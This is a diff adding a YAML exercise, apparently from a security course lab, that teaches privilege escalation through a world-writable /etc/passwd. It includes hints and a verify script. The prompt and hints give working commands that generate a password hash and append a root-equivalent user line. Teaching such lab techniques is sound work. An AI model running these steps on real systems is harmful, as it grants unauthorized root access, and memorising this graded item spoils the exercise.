@@ -1,0 +1,22 @@
+id: "05"
+title: "Writable /etc/passwd (capstone)"
+prompt: |
+  Third vector: the container's /etc/passwd is world-writable (a disaster).
+
+  From the intern shell, create a root-equivalent user by appending a line
+  with a generated password hash:
+
+    openssl passwd -1 -salt kc privesc3
+    echo 'kc:$1$kc$<hash-from-above>:0:0:root:/root:/bin/bash' >> /etc/passwd
+    su kc   (password: privesc3)
+
+  Prove root: whoami → ~/kali-class-work/sec-wk10/privesc-passwd.txt
+  Stamp: kali-class stamp sec-wk10 privesc-passwd
+hints:
+  - "openssl passwd -1 -salt kc privesc3 generates the MD5-crypt hash."
+  - "The appended line format: user:hash:0:0:root:/root:/bin/bash (UID 0 = root)."
+  - "su kc asks for the password 'privesc3'."
+verify:
+  script: "05-privesc-passwd.verify.sh"
+  timeout: 60
+on_success: "Writable /etc/passwd = instant root. Now you know why it's never 666."
